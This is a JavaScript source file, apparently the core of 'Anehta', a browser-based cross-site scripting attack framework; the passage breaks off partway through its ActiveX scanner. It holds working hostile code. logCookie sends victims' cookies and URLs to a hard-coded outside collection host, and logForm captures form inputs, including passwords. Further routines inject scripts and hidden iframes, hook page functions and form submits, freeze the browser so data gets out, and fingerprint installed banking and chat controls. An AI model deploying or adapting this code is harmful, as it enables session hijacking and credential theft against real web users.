//alert("base.js");
// Author: axis
//////////////////////////////////////////////////
//// 定义常量
//////////////////////////////////////////////////
var anehta = {
        Version: '0.5.5',
        Author: 'axis',
        Contact: 'axis@ph4nt0m.org',
        Homepage: 'http://www.ph4nt0m.org',
        Blog: 'http://hi.baidu.com/aullik5',
        projectHome: 'http://anehta.googlecode.com',
        DemoPage: 'http://www.secwiki.com/anehta/demo.html'};

var anehtaurl = "http://www.secwiki.com/anehta";
var feedurl = anehtaurl+"/feed.js";
var logurl = anehtaurl+"/logxss.php?";  // cookie 和 querystring 收集
var watermarkflash = anehtaurl+"/module/flash/anehtaWatermark.swf";  // 客户端水印

var NoCryptMark = "    [NoCryptMark]";
var XssInfo_S = "    [**** ";
var XssInfo_E = " ****]\r\n";


//////////////////////////////////////////////////
//// 定义全局变量和常量
//////////////////////////////////////////////////
var $d=document;


// 定义签名
anehta.signatures = new Object();

// activex 签名
anehta.signatures.activex = new Array(
  "Flash Player 8|ShockwaveFlash.ShockwaveFlash.8|classID",
  "Flash Player 9|ShockwaveFlash.ShockwaveFlash.9|classID",
  "360Safe|360SafeLive.Update|classID",
  "Alibaba User(AliEdit)|Aliedit.EditCtrl|classID",
  "CMB Bank|CMBHtmlControl.Edit|classID",
  //"Apple IPOD USER|IPodUpdaterExt.iPodUpdaterInterface|classID",  非安全的控件
  //"Apple iTunes|iTunesAdmin.iTunesAdmin|classID",
  "JRE 1.5(WebStart)|JavaWebStart.isInstalled.1.5.0.0|classID",
  "JRE 1.6(WebStart)|JavaWebStart.isInstalled.1.6.0.0|classID",
  //"KMPlayer|KMPlayer.TKMPDropTarget|classID",
  //"KingSoft Word(词霸)|KSEngine.Word|classID",
  //"Windows live Messanger|Messenger.MsgrObject|classID",
  //"Nero|NeroFileDialog.NeroFileDlg|classID",
  //"Nokia Cellphone|NokiaCL.PhoneControl|classID",
  "PPlayer|PPlayer.XPPlayer|classID",
  "Tencent QQ|Qqedit.PasswordEditCtrl|classID",
  "QuickTime|QuickTime.QTElementBehavior|classID",
  //"Symantec Anti-Virus|Symantec.stInetTransferItem|classID",
  "Xunlei|XunLeiBHO.ThunderIEHelper|classID",
  //"Yahoo Messenger|Yahoo.Messenger|classID",
  ""
);

anehta.signatures.ffextensions = [
  {name: 'Adblock Plus', url: 'chrome://adblockplus/skin/adblockplus.png'},
  {name: 'Customize Google', url: 'chrome://customizegoogle/skin/32x32.png'},
  {name: 'DownThemAll!', url: 'chrome://dta/content/immagini/icon.png'},
  {name: 'Faster Fox', url: 'chrome://fasterfox/skin/icon.png'},
  {name: 'Flash Block', url: 'chrome://flashblock/skin/flash-on-24.png'},
  {name: 'FlashGot', url: 'chrome://flashgot/skin/icon32.png'},
  {name: 'Google Toolbar', url: 'chrome://google-toolbar/skin/icon.png'},
  {name: 'Greasemonkey', url: 'chrome://greasemonkey/content/status_on.gif'},
  {name: 'IE Tab', url: 'chrome://ietab/skin/ietab-button-ie16.png'},
  {name: 'IE View', url: 'chrome://ieview/skin/ieview-icon.png'},
  {name: 'JS View', url: 'chrome://jsview/skin/jsview.gif'},
  {name: 'Live HTTP Headers', url: 'chrome://livehttpheaders/skin/img/Logo.png'},
  {name: 'SEO For Firefox', url: 'chrome://seo4firefox/content/icon32.png'},
  {name: 'Search Status', url: 'chrome://searchstatus/skin/cax10.png'},
  {name: 'Server Switcher', url: 'chrome://switcher/skin/icon.png'},
  {name: 'StumbleUpon', url: 'chrome://stumbleupon/content/skin/logo32.png'},
  {name: 'Torrent-Search Toolbar', url: 'chrome://torrent-search/skin/v.png'},
  {name: 'User Agent Switcher', url: 'chrome://useragentswitcher/content/logo.png'},
  {name: 'View Source With', url: 'chrome://viewsourcewith/skin/ff/tb16.png'},
  {name: 'Web Developer', url: 'chrome://webdeveloper/content/images/logo.png'}
];    
      
      
anehta.signatures.sites = new Array(
  "http://www.google.com",
  "http://www.google.cn",
  "http://www.baidu.com",
  "http://www.taobao.com",
  "http://www.alipay.com",
  "http://www.sohu.com",
  "http://www.sina.com.cn",
  "http://www.163.com",
  "http://www.qq.com",
  "http://www.qidian.com",
  "http://www.tianyaclub.com",
  "http://www.kaixin001.com",
  "http://www.xiaonei.com",
  "http://planet.ph4nt0m.org",
  "http://hi.baidu.com/aullik5",
  "http://www.secwiki.com/anehta/demo.html",
  "http://hi.baidu.com/fvck"
);
 

anehta.signatures.ports = new Array(21, 22, 23, 25, 53, 80, 
  110, 118, 137, 139, 143, 161, 389, 443, 445, 547, 1080, 1433,
  1521, 3306, 3389, 8000, 8008, 8080, 8888, 10000);

//////////////////////////////////////////////////
//// Core Library
//////////////////////////////////////////////////
anehta.core = {};

// 在time(ms)时间内冻结浏览器;idea from AttackAPI
// 在需要和浏览器抢时间比如关闭窗口,重定向页面时候非常有用
// 在冻结时间内getURL 等还能继续完成
anehta.core.freeze = function(time){
	var date = new Date();
  var cur = null;

  do {
    cur = new Date();
  } while(cur - date < time);
};

/**
 * idea from :jCache - A client cache plugin for jQuery
 * Should come in handy when data needs to be cached in client to improve performance.
 * Author: 	Phan Van An 
 *			phoenixheart@gmail.com
 *			http://www.skidvn.com
 * License : Read jQuery's license

Usage:
    1. 	var cache = new anehta.core.cache();
    2.	[OPTIONAL] Set the max cached item number, for example 20
    	cache.maxSize = 20; 
    3. 	Start playing around with it:
    	- Put an item into cache: cache.setItem(theKey, the Value);
    	- Retrieve an item from cache: var theValue = cache.getItem(theKey);
    	- Empty the cache: cache.clear();
    	- cache.removeItem(theKey);
    	- cache.addItem(theKey, the Value);
    	- cache.dropItem(theKey);
    	- cache.hasItem(theKey);
    	- ...
 */
anehta.core.cache = function(){
	this.version = 'anehta.core.cache v1';
	
	/**
	 * The maximum items this cache should hold. 
	 * If the cache is going to be overload, oldest item will be deleted (FIFO).
	 * Since the cached object is retained inside browser's state, 
	 * a too big value on a too big web apps may affect system memory.
	 * Default is 10.
	 */
	this.maxSize = 30;
	
    /**
     * An array to keep track of the cache keys
     */
	this.keys = new Array();
	
	/**
	 * Number of currently cached items
	 */
	this.cache_length = 0;
	
	/**
	 * An associated array to contain the cached items
	 */
	this.items = new Array();
	
	/*
	 * @desc	Puts an item into the cache
	 *
	 * @param	string Key of the item
	 * @param 	string Value of the item
	 * @return	string Value of the item
	 */
	this.addItem = function(pKey, pValue)
	{
		if (typeof(pValue) != 'undefined') 
		{
			if (typeof(this.items[pKey]) == 'undefined') 
			{
				this.cache_length++;
			}

			this.keys.push(pKey);
			this.items[pKey] = pValue;
			
			if (this.cache_length > this.maxSize)
			{
				this.removeOldestItem();
			}
		}
	   
		return pValue;
	}
	
	/*
	 * @desc	Removes an item from the cache using its key
	 * @param 	string Key of the item
	 */
	 // 仅仅是把key对应的值删除,key的名字和占用的空间还是保留了
	this.removeItem = function(pKey)
	{
		var tmp;
		if (typeof(this.items[pKey]) != 'undefined') 
		{
			this.cache_length--;
			tmp = this.items[pKey];
			delete this.items[pKey];
		}
	   
		return tmp;
	}
	
	// 删除一个key和它占用的空间
	this.dropItem = function(pKey){
		if (typeof(this.items[pKey]) != 'undefined') 
		{
			var key_tmp1 = new Array();
			var key_tmp2 = new Array();
			
			for(i=0; i<this.keys.length; i++){
				if (this.keys[i] == pKey){ // 找到了, 删除中间的
					//alert("matched!");
					this.cache_length--;
					delete this.items[pKey]; 
					
					key_tmp1 = this.keys.slice(0, i);
					key_tmp2 = this.keys.slice(i+1);

					this.key = key_tmp1.concat(key_tmp2);		
				} 
			}	
			//alert("keys end: "+this.key);
			return true;
		}
		return false;
	}

	/*
	 * @desc 	Retrieves an item from the cache by its key
	 *
	 * @param 	string Key of the item
	 * @return	string Value of the item
	 */
	this.getItem = function(pKey) 
	{
		return this.items[pKey];
	}
	
	// 覆盖或者添加一个值
	this.setItem = function(pKey, pValue)
	{
		if(this.hasItem(pKey) == true){ // 有则覆盖
			this.items[pKey] = pValue; // 覆盖值
		}
		else { // 没有则添加
			this.addItem(pKey, pValue);
		} 
	}
	
	// 给指定key对应的值append一个值
	this.appendItem = function(pKey, pValue){
		if(this.hasItem(pKey) == true){ // 有则append
			var key_tmp;
			key_tmp = this.getItem(pKey); // 保存原来的值
			key_tmp = key_tmp + pValue; // append新的值
			this.setItem(pKey, key_tmp); // 覆盖key对应的值为新的值			
		} else { // 找不到指定值, 创建一个新的
			this.setItem(pKey, pValue);			
		}
	}
	
	// 克隆一个cache对象
	this.clone = function(){
		var clone;
		clone = this;
		return clone;		
	}
	
	//获取所有的key值; 包括被drop的，都会显示出来
	this.showKeys = function() 
	{
		return this.keys;
	}

	/*
	 * @desc	Indicates if the cache has an item specified by its key
	 * @param 	string Key of the item
	 * @return 	boolean TRUE or FALSE
	 */
	this.hasItem = function(pKey)
	{
		return typeof(this.items[pKey]) != 'undefined';
	}
	
	/**
	 * @desc	Removes the oldest cached item from the cache
	 */
	this.removeOldestItem = function()
	{
		this.removeItem(this.keys.shift());
	}
	
	/**
	 * @desc	Clears the cache
	 * @return	Number of items cleared
	 */
	this.clear = function()
	{
		var tmp = this.cache_length;
		this.keys = new Array();
		this.cache_length = 0;
		this.items = new Array();
		return tmp;
	}
}

// 初始化一个cache出来共享数据
var anehtaCache = new anehta.core.cache();


// Using Flash Shared Object to Store Watermark
anehta.core.setWatermark = function(flashID, o){
	return document.getElementById(flashID).setWatermark(o);	
}

// Get the info from flash
anehta.core.getWatermark = function(flashID){		  		  
	return document.getElementById(flashID).getWatermark();         
}


anehta.core.parseJSON = function(){
	
}

anehta.core.parseXML = function(){
	
}


//////////////////////////////////////////////////
//// DOM Library
//////////////////////////////////////////////////
anehta.dom = {};

anehta.dom.bindEvent = function (){
	
}

anehta.dom.unbindEvent = function (){
	
}

// from attackAPI
anehta.dom.getDocument = function (target){
	var doc = null;
    
  if (target == undefined) {
    doc = document;
  } else if (target.contentDocument) {
           doc  = target.contentDocument;
         } else if (target.contentWindow) {
                  doc = target.contentWindow.document;
                } else if (target.document) {
                         doc = target.document;
                       }        
  return doc;
}

// 添加一个cookie; 需要cookie名事先不存在. 如果是更改cookie的值请用setCookie
anehta.dom.addCookie = function (cookieName, cookieValue){
	// 为了和setCookie有所分别
	if (anehta.dom.checkCookie(cookieName) == true){
		return false; 
	}
  if (cookieValue != null){
    $d.cookie = cookieName + "=" + cookieValue + "\;" + $d.cookie;
	} else 
		if (cookieName != undefined){
		  //alert("now: "+$d.cookie +" cookieName: "+cookieName);
	    $d.cookie = cookieName + "\;" + $d.cookie; // 不需要"="
	    //alert($d.cookie);
	  }
	return true;  
}

// 检查cookie是否存在,不取值
anehta.dom.checkCookie = function (cookieName){
	var cookies = document.cookie.split( ';' );
	for ( i = 0; i < cookies.length; i++ ){
	  if (cookies[i].indexOf(cookieName) >= 0){
		  return true;
	  }
  }
  return false;
}

// 获取指定cookie的值
// http://techpatterns.com/downloads/javascript_cookies.php
// To use, simple do: Get_Cookie('cookie_name'); 
// replace cookie_name with the real cookie name, '' are required
anehta.dom.getCookie = function (cookieName){
	// first we'll split this cookie up into name/value pairs
	// note: document.cookie only returns name=value, not the other components
	var a_all_cookies = document.cookie.split( ';' );
	var a_temp_cookie = '';
	var cookie_name = '';
	var cookie_value = '';
	var b_cookie_found = false; // set boolean t/f default f
	
	for ( i = 0; i < a_all_cookies.length; i++ )
	{
		// now we'll split apart each name=value pair
		a_temp_cookie = a_all_cookies[i].split( '=' );
		
		
		// and trim left/right whitespace while we're at it
		cookie_name = a_temp_cookie[0].replace(/^\s+|\s+$/g, '');
	
		// if the extracted name matches passed check_name
		if ( cookie_name == cookieName )
		{
			b_cookie_found = true;
			// we need to handle case where cookie has no value but exists (no = sign, that is):
			if ( a_temp_cookie.length > 1 )
			{
				cookie_value = unescape( a_temp_cookie[1].replace(/^\s+|\s+$/g, '') );
			}
			// note that in cases where cookie is initialized but no value, null is returned
			return cookie_value;
			break;
		}
		a_temp_cookie = null;
		cookie_name = '';
	}
	if ( !b_cookie_found ) 
	{
		return null;
	}
}

// 设置某个cookie的值;需要该cookie存在，否则返回false
anehta.dom.setCookie = function (cookieName, cookieValue){
	var cookies = $d.cookie.split(';');
	var single_cookie;
	var newcookies = new Array();
	var ret = false; // 若是没有找到cookieName 则返回false
	
	for (i=0; i<cookies.length; i++){
		if (cookies[i].indexOf("=")<0){ //没有"="的情况
			if (cookies[i] == cookieName){
				newcookies[i]=cookies[i] + "=" + cookieValue + ";";
				ret = true;
			} else {
			  newcookies[i]=cookies[i] + ";";
		  }
		}
		else {
			single_cookie = cookies[i].split('=');
		
		  if ($.trim(single_cookie[0]) == cookieName){
			  //alert("matched! "+cookies[i]);
			  newcookies[i] = single_cookie[0] + "=" + cookieValue + ";";
			  ret = true;
		  } else{
		    newcookies[i]=cookies[i] + ";";
		  }
	  }
		$d.cookie = newcookies[i]; // 改变cookie的值
	}
	//alert(newcookies);
	return ret;
}

// 实际上只能expire cookie
anehta.dom.delCookie = function (cookieName){
	if (anehta.dom.checkCookie(cookieName) == false){
		return false; 
	}
		
  var exp = new Date();
  try{
    document.cookie = cookieName + "=" + anehta.dom.getCookie(cookieName) + 
                      ";" + "expires=" + exp.toGMTString() + ";" + ";";
  } catch (e){
  	return false;
  }
  //alert(document.cookie);
  return true;
}

// 让一个cookie不过期
anehta.dom.persistCookie = function(cookieName){
	if (anehta.dom.checkCookie(cookieName) == false){
		return false; 
	}
	
	try{
    document.cookie = cookieName + "=" + anehta.dom.getCookie(cookieName) + 
                      ";" + "expires=Thu, 01-Jan-2038 00:00:01 GMT;";
  } catch (e){
  	return false;
  }
	return true;
}

// 取当前URI中某个参数的值
anehta.dom.getQuerystr = function(QueryStrName){
	var queryStr;
	var queryStr_temp;
	queryStr = window.location.href.substr(window.location.href.indexOf("?")+1).split('&');
	
	for (i=0; i<queryStr.length; i++){
		queryStr_temp = queryStr[i].split('=');
		if (queryStr_temp[0] == QueryStrName){ // 找到了
			return queryStr_temp[1]; // 返回值
		}		
	}
	return null; // 否则返回空
}


//////////////////////////////////////////////////
//// Net Library
//////////////////////////////////////////////////
anehta.net = {};

// get 请求
anehta.net.getURL = function(s){
	var image = new Image();
	image.style.width = 0;
	image.style.height = 0;
	image.src = s;
}

// 提交表单  
anehta.net.postForm = function(url){
        var f;
	f=document.createElement('form');	
	f.action=url;
	f.method="post";
	//f.method="get";
	document.getElementsByTagName("body")[0].appendChild(f);
	f.submit();
}

//////////////////////////////////////////////////
//// Logger Library
//////////////////////////////////////////////////
anehta.logger = {};

anehta.logger.logInfo = function(param){
	param = NoCryptMark + XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
          XssInfo_S + "Info: " + param + XssInfo_E;
	param = escape(param);
	anehta.net.getURL(logurl+param);
}

anehta.logger.logCookie = function(){
	var param = XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
	            XssInfo_S+"Request URI: "+escape(window.location.href)+XssInfo_E+ // 获取当前URI
              XssInfo_S+"Cookie: "+escape(document.cookie)+XssInfo_E ;  //获取当前cookie
	
  param = anehta.crypto.base64encode(param); // base64 加密参数传输; 使用base64加密对性能影响很大
  //alert(param);
  // 发送cookie 和 uri 回 server
  anehta.net.getURL(logurl+param);
}

/*
* Name: logForm
* Args:
*       o - specified form object
*       url - the url you want to get with form information
*       delay - time span you want to delay
* e.g.
*       <form onsubmit="return logForm(this, 'http://www.target.com', 500);" method="post" ...>
*/
anehta.logger.logForm = function(o) {
	//alert("logForm");
	var inputs = o.getElementsByTagName("input");
	//url += "?";
	var param = ""; // form的参数

	for (var i = 0; i < inputs.length; i ++) {
		if (inputs[i].getAttribute("name") != null && 
			inputs[i].getAttribute("name") != "") {
			param += escape(inputs[i].getAttribute("name")) + "=" + escape(inputs[i].value) + "&";
		}
	}
	
	// 记录提交的参数到远程服务器
	param = XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
	        XssInfo_S + "Form Sniffer: " + escape(param) + XssInfo_E;
	param = anehta.crypto.base64encode(param); //base64时候对时间影响太大,会导致还没发包就页面跳转,从而出错
	//alert(param);
	
	var img = document.createElement("IMG");
	document.body.appendChild(img);
	img.width = 0;
	img.height = 0;
	img.src = logurl+param;
	
	// 需要冻结一段时间保证getURL成功完成
	anehta.core.freeze(300);	
	//return false;
} 

// 定期检查client cache,并把其中的信息发送到server
anehta.logger.logCache = function(){
	var interval = 5000; // 检查的频率
	var cache_tmp = "";
	setInterval(function(){		
		// 正常记录cache里数据
		var keys = anehtaCache.showKeys();
	    if (keys != null){ // cache里有东西
	    	var cache = "";
		    for (i=0; i<keys.length; i++) {
		     	if (anehtaCache.hasItem(keys[i]) == true){
		     		cache = cache + "\r\n" + XssInfo_S + keys[i] + ": " + anehtaCache.getItem(keys[i]) + XssInfo_E;
		     	}
		    }
		    //alert(cache_tmp);
		    if(cache != cache_tmp){ // 有变化才发送,没有变化不发送
		    //if(cache != ""){ // 有记录才发送,没有记录不发送
		    	try {
		    		// 如果cache太长会导致请求失败
		        anehta.logger.logInfo(cache); 
		        //anehtaCache.clear(); 
		        cache_tmp = cache; // 把当前cache保存在cache_tmp 中
		      } catch (e) {
		      	//alert(e);
		      }
		    }
	    }
	  },
	  interval);
}


//////////////////////////////////////////////////
// Ajax Library 
//////////////////////////////////////////////////
anehta.ajax = {};

/*
* XmlHttp 类
*/
anehta.ajax.XmlHttp = function() {
	var o = null;
	
	var readyStateChange = function(processResponseProc) {
		if (o.readyState == 4) {
			//if (o.status == 200 || o.status == 0) {
			// 使得永远返回真.看回显
			if (o.status) {
				processResponseProc(o.responseText, o.getAllResponseHeaders());
			} /*else if (o.status == 302 || o.status == 301 || o.status == 304) { 
				processResponseProc(null, o.getAllResponseHeaders());
			} else {
				processResponseProc(null, null);
			}*/
		}
	};

	var setRequestHeaders = function(headers) {
		var header, name, value;

		if (headers == null || headers == undefined) {
			return;
		}

		for (var i = 0; i < headers.length; i ++) {
			header = headers[i];
			if (header.indexOf(":") < 0) {
				continue;
			}
			name = header.split(":")[0];
			value = header.substring(header.indexOf(":") + 1);
			o.setRequestHeader(name, value);
		}
	}

	return {
		/*
		* init 方法
		*
		* 返回值
		* 如果初始化成功则返回true，否则返回false
		*
		* 说明
		* 初始化XmlHttp对象，
		*/
		init : function() {
			if (o == null) {
				if (window.XMLHttpRequest) {
					try {
						o = new XMLHttpRequest();
					} catch (ex) {
						return false;
					}
				} else if (window.ActiveXObject) {
					try {
						o = new ActiveXObject("Msxml4.XMLHttp");
					} catch (ex) {
						try {
							o = new ActiveXObject("Msxml2.XMLHttp");
						} catch (ex) {
							try {
								o = new ActiveXObject("Microsoft.XMLHttp");
							} catch (ex) {
								return false;
							}
						}
					}
				}
			}

			return true;
		},

		/*
		* get 方法
		*
		* 参数
		* url - 要请求的url
		* processResponse - 处理返回结果委托
		*
		* 返回值
		* 如果请求发起成功则返回true,否则返回false
		*
		* 说明
		* 发起http请求
		*/
		get : function(url, headers, processResponse) {
			try {
				o.open("GET", url, true);
				setRequestHeaders(headers);
				o.onreadystatechange = function() { readyStateChange(processResponse); };
				// 自动带上当前cookie, 对FF有效
				o.setRequestHeader("Cookie", document.cookie);
				o.send(null); // FF里函数一定要带参数,否则函数会不执行
				return true;
			} catch (ex) {
				return false;
			}
		},

		/*
		* post 方法
		*
		* 参数
		* url - 要请求的url
		* data - 发送的数据，注意这里值必须是urlencode过的
		* processResponse - 处理返回结果委托
		*
		* 返回值
		* 如果请求发起成功则返回true,否则返回false
		*
		* 说明
		* 发起post请求
		*/
		post : function(url, data, headers, processResponse) {
			processResponseProc = processResponse;
			try {
				o.open("POST", url, true);
				setRequestHeaders(headers);
				o.onreadystatechange = function() { readyStateChange(processResponse); };
				o.setRequestHeader("Content-Length", data.length);
				o.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
				// 自动带上当前cookie; 在firefox中正常,IE中设置不了
				o.setRequestHeader("Cookie", document.cookie);
				o.send(data);
				return true;
				//return processResponse;
			} catch (ex) {
				return false;
			}
		}
	};
};

/*  使用方法
var xmlhttp = new anehta.ajax.XmlHttp();
if (xmlhttp.init()) {
	var url = "http://cn.yahoo.com";

	xmlhttp.post(url, "", null, function(response, responseHeaders) {
		if (responseHeaders != null) {
			alert(responseHeaders);
		}

		if (response != null) {
			alert(response);
		}
	});
}
*/

// 初始化AJAX
var xmlhttp = new anehta.ajax.XmlHttp();

// 重新封装POST/GET  返回数据写在cache中
/*
* anehtaCache.getItem("ajaxPostResponseHeaders"));
* anehtaCache.getItem("ajaxPostResponse"));
* anehtaCache.hasItem("ajaxPostResponse"));
*/
anehta.ajax.post = function(url, param){ 
  // 第二个参数是提交的参数,第三个参数是headers
	xmlhttp.post(url, param, null, function(response, responseHeaders) {
		 if (responseHeaders != null) {
			 //alert(responseHeaders);
			 anehtaCache.setItem("ajaxPostResponseHeaders", responseHeaders);
		 }
    
		 if (response != null) {
			 //alert(response);
			 anehtaCache.setItem("ajaxPostResponse", response);
		 }		    
	 });
}
 

anehta.ajax.get = function(url){
  // 第二个参数是headers
	xmlhttp.get(url, null, function(response, responseHeaders) {
		if (responseHeaders != null) {
			//alert(responseHeaders);
			anehtaCache.setItem("ajaxGetResponseHeaders", responseHeaders);
		}
    
		if (response != null) {
			//alert(response);
			anehtaCache.setItem("ajaxGetResponse", response);
		}
	});
} 


//////////////////////////////////////////////////
//// Injection Library
//////////////////////////////////////////////////
anehta.inject = {};

anehta.inject.injectScript = function(ptr_sc){
  s=document.createElement("script");
  s.src=ptr_sc;
  document.getElementsByTagName("body")[0].appendChild(s);
  return s;
}

// s需要是一个script对象
anehta.inject.removeScript = function(s){
	document.body.removeChild(s);
}

anehta.inject.addScript = function(ptr_sc){
  document.write("<script src='"+ptr_sc+"'></script>");
}

anehta.inject.injectCSS = function(ptr_sc){
	var c = document.createElement("link");
	c.type = "text/css";
	c.rel = "stylesheet";
	c.href = ptr_sc;
	document.getElementsByTagName("body")[0].appendChild(c);
	return c;
}

anehta.inject.createIframe = function(w) {
	var d = w.document;
	var newIframe = d.createElement("iframe");
	newIframe.style.width = 0;
	newIframe.style.height = 0;
	d.body.appendChild(newIframe);
	newIframe.contentWindow.document.write("<html><body></body></html>");
	return newIframe;
}

anehta.inject.injectScriptIntoIframe = function(f, proc) {
	var d = f.contentWindow.document;
	var s = "<script>\n(" + proc.toString() + ")();\n</script>";
	d.write(s);
}

anehta.inject.injectIframe = function(remoteurl) {
	var newIframe = $d.createElement("iframe");
	newIframe.style.width = 0;
	newIframe.style.height = 0;
	newIframe.src = remoteurl;
	$d.body.appendChild(newIframe);
	return newIframe;	
}

anehta.inject.injectFlash = function(flashId, flashSrc, flashParam) {
	//flashParam = '?' + flashParam;
	document.write('<object type="application/x-shockwave-flash" data="' + flashSrc +
	         '" width="0" height="0" id="' + flashId +
	         '"><param name="allowScriptAccess" value="always" /> ' +
	         '<param name="movie" value="' + flashSrc + '" />' +
	         '<PARAM NAME=FlashVars VALUE="domainAllowed=' + flashParam + '" />' +
	         '<param name="bgColor" value="#fff" /> </object>');	
}

anehta.inject.injectApplet = function() {
	
}

/* 一般JS函数的hook, 使用委托
   @axis
   注意hook函数加载前,如果函数已经调用了,则该函数无法hook 
   var hj = new hookJsFunction();
   
   //自己定义的函数需要返回一个array作为被hook函数的新参数
   //可以劫持参数,不能递归调用
   hj.hook("被hook的函数名", "保存原函数的变量", "你的函数名");
   
   hi.unhook("被hook的函数名", "保存原函数的变量");
   
   //可以递归注入函数,不能劫持参数
   hj.injectFn("被inject的函数名", "保存原函数的变量", "你的函数名");
*/
anehta.inject.hookFunction = function (){
	//alert("hookjsfunc");
  // 保存原函数;还是需要作为参数指定一个,
  //否则多次hook后会丢失之前保存的原函数
	//var RealFuncAfterHooked;  

  return {
	  hook: function(funcNameHooked, RealFuncAfterHooked, hookFunc){
	  	try {
	  	  setTimeout(function(){ 
	  		  //alert("hook before: "+window[funcNameHooked]);
	  		  // 保存原函数
	  		  window[RealFuncAfterHooked] = window[funcNameHooked];
	  		  //window[funcNameHooked] = window[hookFunc];
	  		  // 参数个数可以根据需要进行调整
	  		  window[funcNameHooked] = function (param1,param2,param3,param4,param5,param6,param7){
	  		  	// 劫持参数
	  		  	var newParam = new Array();

	  			  // 先执行注入的函数; 需要返回被劫持后的参数,作为新参数传入原函数
	  			  newParam = window[hookFunc](param1, param2, param3, param4, param5, param6, param7); 
	  			  //alert("newParam= "+newParam);
	  			  // 再执行原函数
	  			  window[RealFuncAfterHooked](newParam[0], newParam[1], newParam[2], newParam[3], 
	  			                              newParam[4], newParam[5], newParam[6]); 
	  			                              
	  			  // 不注入参数,直接执行原函数;                            
	  			  //window[RealFuncAfterHooked](param1,param2,param3,param4,param5,param6,param7);  
	  			  }
	  		  //alert("hook after: "+window[funcNameHooked]);
	  		  }, 
		      10);
		    return true;
		  } catch (e){
			  return false;
		  }
	  },
	  
	  unhook: function(funcNameHooked, RealFuncAfterHooked){
	  	try {
	  	  setTimeout(function(){ 
	  		  //alert("unhook before: "+window[funcNameHooked]);
	  		  window[funcNameHooked] = function (param1,param2,param3,param4,param5,param6,param7){
	  			  window[RealFuncAfterHooked](param1,param2,param3,param4,param5,param6,param7);  // 执行原函数;
	  		  }
	  		  //alert("unhook after: "+window[funcNameHooked]);
	  		  }, 
		      10);
		    return true;
		  
		 } catch (e){
		 	  return false;
		 }
	  },
	  
	  injectFn: function(funcNameInjected, RealFuncAfterInjected, injectFunc){
	  	try {
	  	  setTimeout(function(){ 
	  		  // 保存原函数
	  		  window[RealFuncAfterInjected] = window[funcNameInjected];
	  		  // 参数个数可以根据需要进行调整
	  		  window[funcNameInjected] = function (param1,param2,param3,param4,param5,param6,param7){
	  			  // 先执行注入的函数
	  			  window[injectFunc](param1, param2, param3, param4, param5, param6, param7); 
	  			  // 再执行原函数
	  			  window[RealFuncAfterInjected](param1,param2,param3,param4,param5,param6,param7);  
	  			  }
	  		  }, 
		      10);
		    return true;
		  } catch (e){
			  return false;
		  }
	  }	  
	};	
};

// 初始化hook
var anehtaHook = new anehta.inject.hookFunction();

/*
* Name: hookSubmit 
* Args:
*       o - specified form object
* e.g.
*       <form onkeydown="javascript: hookSubmit(this);" ..>
*
* If the form uses javascript to call submit method for submitting, you should install a hook on the form.
*/
anehta.inject.hookSubmit = function(o, injectFuncCallBack) {
	//alert();
	if (o.hooked == undefined) {
		o.hooked = true;
		o._submit = o.submit;

		o.submit = function() {
			//alert("submit hooked!");
			// hook函数的功能作为第二个参数在这里调用
			injectFuncCallBack();					
			o.onsubmit();
		}
	}
}



//////////////////////////////////////////////////
//// Detect Library
//////////////////////////////////////////////////
anehta.detect = {};

/* detect browser type,version
   var bs = new anehta.detect.browser();
   if ( bs.type() == "msie" ){
	 alert(bs.version());
*/
anehta.detect.browser = function (){
	return {
		type : function(){
			//$.browser.msie/safari/opera/mozilla
			if($.browser.msie){ return "msie";}
			else if($.browser.mozilla){return "mozilla";}
				else if($.browser.opera){return "opera";}
					else if($.browser.safari){return "safari";}
						else {return "unknown";}
		},
		
		version : function(){
			return $.browser.version;	
		}
	};
};

// 先判断浏览器版本 $.browser.msie/safari/opera/mozilla
var anehtaBrowser = new anehta.detect.browser();

// 跨浏览器检查某个版本的flash是否支持
// anehta.detect.flash("8"); 支持返回true,不支持返回false
// 执行完后，flash版本被保存到 anehtaCache的 FlashVer 中
anehta.detect.flash = function(targetVersion){
	var FlashDetector_Version;
	var playable = false;
	
	if (anehtaBrowser.type() == "msie" || anehtaBrowser.type() == "opera"){
		try {
			FlashDetector_Version = "ShockwaveFlash.ShockwaveFlash." + targetVersion;
		  FlashObj = new ActiveXObject(FlashDetector_Version);
		  anehtaCache.setItem("FlashVer", FlashDetector_Version); // 保存到cache中		  
		  playable = true;
		} catch (e){
			return playable;
		}
	} 
	else if (anehtaBrowser.type() == "mozilla"){
	  var pObj = null;
	  var tokens, len, curr_tok;
	  var hasVersion = -1;
	  
	  if(navigator.mimeTypes && navigator.mimeTypes['application/x-shockwave-flash'])
	  {
	    pObj = navigator.mimeTypes['application/x-shockwave-flash'].enabledPlugin;
	  }
	  if(pObj != null)
	  {
	    tokens = navigator.plugins['Shockwave Flash'].description.split(' ');
	    len = tokens.length;
	    while(len--)
	    {
	  	  curr_tok = tokens[len];
	  	  if(!isNaN(parseInt(curr_tok)))
	  	  {
	  	    hasVersion = curr_tok;
	  	    FlashDetector_Version = curr_tok;  // flash版本
	  	    anehtaCache.setItem("FlashVer", FlashDetector_Version); // 保存到cache中
	  	    break;
	  	  }
	    }
	    if(hasVersion >= targetVersion)
	    {
	  	  playable = true;
	    }
	    else
	    {
	  	  playable = false;
	    }
	  }
  }
  return playable;
};

anehta.detect.java = function(){

}

anehta.detect.internalIP = function(){

}

anehta.detect.hostname = function(){

}

anehta.detect.httponly = function(){
	
}

anehta.detect.activex = function(objName){ // 需要指定object name
	try {
		  var Obj = new ActiveXObject(objName);
		  return true;
  } catch (e){
			return false;
  }
}

anehta.detect.ffplugin = function(pluginName){
	if (anehtaBrowser.type() == "mozilla"){ 
	  var allplugins;
	  allplugins = anehta.scanner.ffplugins();
	  if ( allplugins.indexOf(pluginName) > -1 ){ // 找到了
	  	return true;
	  }
  }
  return false;
}


// 通过图片的状态检查是否存在ff扩展; extname需要是anehta.signatures.ffextensions中的
anehta.detect.ffextension = function (extname){

}


//////////////////////////////////////////////////
// Scanner Library
//////////////////////////////////////////////////
anehta.scanner = {};


// 扫描签名中定义好的activex
anehta.scanner.activex = function(){
	if (anehtaBrowser.type() == "msie"){
	  var objtmp;
	  for (i=0; i<anehta.signatures.activex.length; i++){
		  objtmp = anehta.signatures.activex[i].split('|'); // 分隔符是"|"
		  if ( anehta.detect.activex(objtmp[1]) == true ){
